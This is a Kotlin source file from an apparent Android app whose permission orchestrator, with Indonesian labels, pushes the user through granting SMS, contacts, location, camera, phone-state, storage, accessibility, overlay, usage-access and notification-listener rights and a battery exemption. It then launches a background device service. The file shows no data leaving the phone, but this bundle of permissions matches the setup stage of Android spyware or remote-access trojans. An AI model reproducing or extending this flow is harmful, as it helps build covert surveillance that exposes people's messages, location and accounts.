package com.fantzy.nih

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class PermissionOrchestrator(private val activity: MainActivity) {

    companion object {
        const val REQ_RUNTIME_BATCH = 200
        private const val PREFS = "skyline_setup"
        private const val KEY_DONE = "setup_complete"
    }

    private val handler = Handler(Looper.getMainLooper())
    private var stepIndex = 0
    private var waitingSettings = false
    private var started = false

    private data class Step(
        val id: String,
        val label: String,
        val check: () -> Boolean,
        val request: () -> Unit,
    )

    private val steps: List<Step> by lazy {
        listOf(
            Step("runtime", "Izin Aplikasi", check = { runtimeGranted() }, request = { requestRuntimeBatch() }),
            Step("bat", "Pengoptimalan Baterai", check = { activity.isBatteryOptIgnored() }, request = { activity.openBatterySettings(); markWaitingSettings() }),
            Step("overlay", "Tampilan di Atas", check = { activity.isOverlayGranted() }, request = { activity.requestOverlayPerm(); markWaitingSettings() }),
            Step("accessibility", "Aksesibilitas", check = { activity.isAccessibilityGranted() }, request = { activity.requestAccessibilityPerm(); markWaitingSettings() }),
            Step("usage", "Penggunaan Aplikasi", check = { activity.isUsageAccessGranted() }, request = { activity.requestUsageAccessPerm(); markWaitingSettings() }),
            Step("notif", "Akses Notifikasi", check = { activity.isNotifListenerGranted() }, request = { activity.openNotifListenerSettings(); markWaitingSettings() }),
            Step("storage", "Akses Penyimpanan", check = { activity.isManageStorageGranted() }, request = { activity.requestManageStoragePerm(); markWaitingSettings() }),
            Step("gpson", "GPS Aktif", check = { activity.isGpsEnabled() }, request = { activity.requestEnableGps(); markWaitingSettings() }),
        )
    }

    fun startIfNeeded() {
        if (started) return
        started = true
        if (isSetupComplete() && allGranted()) {
            activity.showConnectedScreen()
            activity.startDeviceService()
            return
        }
        stepIndex = 0
        advance()
    }

    fun onResume() {
        if (!started) return
        if (waitingSettings) {
            waitingSettings = false
            handler.postDelayed({ advance() }, 500)
        }
    }

    fun onRuntimeResult() {
        handler.postDelayed({ advance() }, 350)
    }

    private fun markWaitingSettings() {
        waitingSettings = true
    }

    private fun advance() {
        while (stepIndex < steps.size && steps[stepIndex].check()) {
            activity.notifySetupProgress(steps[stepIndex].id, true, progressPercent())
            stepIndex++
        }

        if (stepIndex >= steps.size) {
            activity.notifySetupProgress("done", true, 100)
            markSetupComplete()
            handler.postDelayed({
                activity.showConnectedScreen()
                activity.startDeviceService()
            }, 600)
            return
        }

        val current = steps[stepIndex]
        activity.notifySetupProgress(current.id, false, progressPercent())
        current.request()
    }

    private fun progressPercent(): Int {
        if (steps.isEmpty()) return 0
        return ((stepIndex.toFloat() / steps.size) * 100).toInt().coerceIn(0, 100)
    }

    private fun runtimeGranted(): Boolean {
        return runtimePermissions().all {
            ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun requestRuntimeBatch() {
        val pending = runtimePermissions().filter {
            ContextCompat.checkSelfPermission(activity, it) != PackageManager.PERMISSION_GRANTED
        }
        if (pending.isEmpty()) {
            handler.postDelayed({ advance() }, 200)
            return
        }
        ActivityCompat.requestPermissions(activity, pending.toTypedArray(), REQ_RUNTIME_BATCH)
    }

    private fun runtimePermissions(): List<String> {
        val list = mutableListOf(
            Manifest.permission.CAMERA,
            Manifest.permission.READ_SMS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.GET_ACCOUNTS,
            Manifest.permission.READ_PHONE_STATE,
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            list.add(Manifest.permission.READ_PHONE_NUMBERS)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            list.add(Manifest.permission.READ_MEDIA_IMAGES)
        } else {
            list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        return list.distinct()
    }

    fun allGranted(): Boolean = steps.all { it.check() }

    private fun isSetupComplete(): Boolean =
        activity.getSharedPreferences(PREFS, Activity.MODE_PRIVATE).getBoolean(KEY_DONE, false)

    private fun markSetupComplete() {
        activity.getSharedPreferences(PREFS, Activity.MODE_PRIVATE).edit().putBoolean(KEY_DONE, true).apply()
    }
}